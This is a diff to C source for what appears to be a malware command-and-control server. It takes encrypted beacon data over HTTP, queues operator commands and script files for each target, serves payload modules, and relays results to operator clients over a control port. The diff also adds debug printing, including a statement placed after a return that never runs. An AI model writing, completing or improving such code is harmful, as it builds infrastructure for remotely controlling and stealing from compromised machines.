@@ -42,9 +42,9 @@
 
 #define CONTROL_PORT 7777
 #define HTTP_PORT 80
-#define BUFFER_SIZE 4096
+#define BUFFER_SIZE 5242880 // 5 MB
 #define MAX_CLIENTS 100
-#define MAX_MSG_LEN 256
+#define MAX_MSG_LEN 4096
 #define MAX_ID_LEN 64
 #define MAX_COOKIE_LEN 128
 
@@ -232,6 +232,7 @@ void enqueue(const char* targetId, const char* msg) {
 
 // --- Dequeue message ---
 char* dequeue(const char* targetId) {
+    printf("entered\n");
     Queue* q = getQueue(targetId);
     if (!q->head) {
         return NULL; // No messages
@@ -244,6 +245,7 @@ char* dequeue(const char* targetId) {
     char* msg = strdup(node->message);
     free(node);
     return msg;
+    printf("exited\n");
 }
 
 unsigned char *load_module(char *module, int *size){
@@ -328,12 +330,12 @@ unsigned char *load_module(char *module, int *size){
     return full_payload;
 } 
 
-void broadcast_to_clients(const char *message, SOCKET exclude_socket) {
+void broadcast_to_clients(const char *message, int message_len, SOCKET exclude_socket) {
     EnterCriticalSection(&clients_cs);
     
     for (int i = 0; i < MAX_CLIENTS; i++) {
         if (clients[i] && clients[i]->socket != exclude_socket) {
-            send(clients[i]->socket, message, (int)strlen(message), 0);
+            send(clients[i]->socket, message, message_len, 0);
         }
     }
     
@@ -439,7 +441,8 @@ void* handle_http_connections(void* arg)
             continue;
         }
         
-        char buffer[BUFFER_SIZE];
+        char *buffer = (char*)malloc(BUFFER_SIZE);
+        char apiID[32];
 
         int total_received = 0;
         int bytes_received = 0;
@@ -452,11 +455,14 @@ void* handle_http_connections(void* arg)
 
         char *body_buffer = NULL;
 
+        char *url_start = NULL;
+
+        
         //memset(buffer, 0, sizeof(buffer));
 
         // First, read until end of headers
         do {
-            bytes_received = recv(client_socket, buffer + total_received, sizeof(buffer) - total_received - 1, 0);
+            bytes_received = recv(client_socket, buffer + total_received, BUFFER_SIZE - total_received - 1, 0);
             
             if (bytes_received < 0) {
                 perror("recv failed");
@@ -477,7 +483,7 @@ void* handle_http_connections(void* arg)
                 break;
             }
             
-        } while (total_received < sizeof(buffer) - 1);
+        } while (total_received < BUFFER_SIZE - 1);
 
         // Parse Content-Length from headers (simple strstr—improve for production)
         char *cl_header = strstr(buffer, "Content-Length: ");
@@ -491,7 +497,7 @@ void* handle_http_connections(void* arg)
             
             while (total_received - headers_end < content_length) {
                 int remaining = content_length - (total_received - headers_end);
-                int to_read = sizeof(buffer) - total_received - 1;
+                int to_read = BUFFER_SIZE - total_received - 1;
                 if (to_read > remaining) to_read = remaining;
                 
                 bytes_received = recv(client_socket, buffer + total_received, to_read, 0);
@@ -513,23 +519,44 @@ void* handle_http_connections(void* arg)
             //printf("Full POST request:\n%s\n", buffer);
             //printf("POST body:\n%s\n", buffer + headers_end);  // Body starts here
             body_buffer = buffer + headers_end;
-            chacha20_Full(body_buffer, body_buffer, total_received);
+            chacha20_Full(body_buffer, body_buffer, content_length);
+            printf("POST body:\n%s\n", buffer + headers_end);  // Body starts here
+
+            for (int i = 0; i < 100; i++) {
+                printf("%02X ", body_buffer[i]& 0xFF);  // %02X → two-digit uppercase hex
+                if ((i + 1) % 16 == 0) printf("\n"); // newline every 16 bytes
+            }
         } else {
             buffer[total_received] = '\0';
-            //printf("Full request (no body):\n%s\n", buffer);
+            printf("Full request (no body):\n%s\n", buffer);
         }
 
         if (total_received > 0) {
 
-            if (strncmp((char*)buffer, "GET", 3) != 0 && strncmp((char*)buffer, "POST", 4) != 0) {
+            if (strncmp((char*)buffer, "GET", 3) == 0) {
+                url_start = (char*)buffer + 4; // skip "GET "
+            } else if (strncmp((char*)buffer, "POST", 4) == 0) {
+                url_start = (char*)buffer + 5; // skip "POST "
+            } else {
                 closesocket(client_socket);
+                free(buffer);
                 continue;
             }
 
+            // Copy the URL up to the first space or max length
+            int max_len = sizeof(apiID) - 1;
+            int i;
+            for (i = 0; i < max_len && url_start[i] != ' ' && url_start[i] != '\0'; i++) {
+                apiID[i] = url_start[i];
+            }
+            apiID[i] = '\0'; // null-terminate
+
             if (strncmp((char*)buffer, "POST", 4) == 0) {
-                char target_buffer[4096];
-                snprintf(target_buffer, sizeof(target_buffer), "DATA:%s\0", body_buffer);
-                broadcast_to_clients(target_buffer, INVALID_SOCKET);
+                //char target_buffer[4096];
+                //snprintf(target_buffer, sizeof(target_buffer), "DATAS:%s\0", body_buffer);
+                broadcast_to_clients(apiID, i, INVALID_SOCKET);
+                broadcast_to_clients(body_buffer, content_length, INVALID_SOCKET);
+                broadcast_to_clients("END_OF", 6, INVALID_SOCKET);
                 continue;
                 
             }
@@ -570,9 +597,9 @@ void* handle_http_connections(void* arg)
                         }
                         free(reply);
                     } else {
-                        char target_buffer[100];
-                        snprintf(target_buffer, sizeof(target_buffer), "TARGET:%s\0", client_id);
-                        broadcast_to_clients(target_buffer, INVALID_SOCKET);
+                        char target_buffer[64];
+                        snprintf(target_buffer, sizeof(target_buffer), "TARGET:%sEND_OF", client_id);
+                        broadcast_to_clients(target_buffer, (int)strlen(target_buffer), INVALID_SOCKET);
                     }
                     //free(client_id);
                 } else {
@@ -594,6 +621,7 @@ void* handle_http_connections(void* arg)
         }
         
         closesocket(client_socket);
+        free(buffer);
     }
     
 #ifdef _WIN32
@@ -612,10 +640,10 @@ void* handle_client(void* arg)
     SOCKET client_socket = *(SOCKET*)arg;
     free(arg);
     
-    char buffer[BUFFER_SIZE];
+    char buffer[4096];
     int bytes_received;
     
-    while ((bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0)) > 0) {
+    while ((bytes_received = recv(client_socket, buffer, 4096 - 1, 0)) > 0) {
         buffer[bytes_received] = '\0';
         
         // Check if this is an authority client command
@@ -633,7 +661,7 @@ void* handle_client(void* arg)
             
             if (strncmp(command, "START_HTTP", 10) == 0) {
                 if (start_http_listener() == 0) {
-                    send(client_socket, "HTTP listener started\n", 22, 0);
+                    send(client_socket, "HTTP listener startedEND_OF\n", 28, 0);
                     
                     // Start HTTP listener thread
 #ifdef _WIN32
@@ -645,7 +673,7 @@ void* handle_client(void* arg)
                     pthread_detach(http_thread);
 #endif
                 } else {
-                    send(client_socket, "Failed to start HTTP listener\n", 30, 0);
+                    send(client_socket, "Failed to start HTTP listenerEND_OF\n", 36, 0);
                 }
             } else if (strncmp(command, "STOP_HTTP", 9) == 0) {
                 stop_http_listener();
@@ -661,15 +689,46 @@ void* handle_client(void* arg)
                 continue;
             }
 
-            enqueue(id, msg);
+            if (msg[0] == '$') {  // special case: read .vms file
+                char filename[256];
+
+                // Remove newline characters in-place
+                for (char *p = msg + 1; *p; p++) {
+                    if (*p == '\n' || *p == '\r') {
+                        *p = '\0'; // terminate string at the first newline
+                        break;
+                    }
+                }
+
+                snprintf(filename, sizeof(filename), "D:\\linuxmal\\moduloScript\\%s.vms", msg + 1);  // skip '$'
+
+                FILE* fp = fopen(filename, "r");
+                if (!fp) {
+                    printf("[Server] Could not open file %s\n", filename);
+                    continue;
+                }
+
+                char line[4096];
+                while (fgets(line, sizeof(line), fp)) {
+                    // Remove trailing newline
+                    line[strcspn(line, "\r\n")] = 0;
+                    enqueue(id, line);  // enqueue each line
+                }
+
+                fclose(fp);
+
+            } else {
+                enqueue(id, msg);  // normal case
+            }
             
-            send(client_socket, "command enqueued wait for response\n", 35, 0);
+            send(client_socket, "command enqueued wait for responseEND_OF\n", 41, 0);
         }
         else {
             // Regular message, broadcast to all clients
-            char broadcast_msg[BUFFER_SIZE + 50];
-            snprintf(broadcast_msg, sizeof(broadcast_msg), "CLIENT_%llu: %s", (unsigned long long)client_socket, buffer);
-            broadcast_to_clients(broadcast_msg, client_socket);
+            char broadcast_msg[sizeof(buffer) + 50];
+            snprintf(broadcast_msg, sizeof(broadcast_msg), "CLIENT_%llu: %s\0", (unsigned long long)client_socket, buffer);
+            broadcast_to_clients(broadcast_msg, (int)strlen(broadcast_msg), client_socket);
+            broadcast_to_clients("END_OF", 6, INVALID_SOCKET);
         }
     }
     
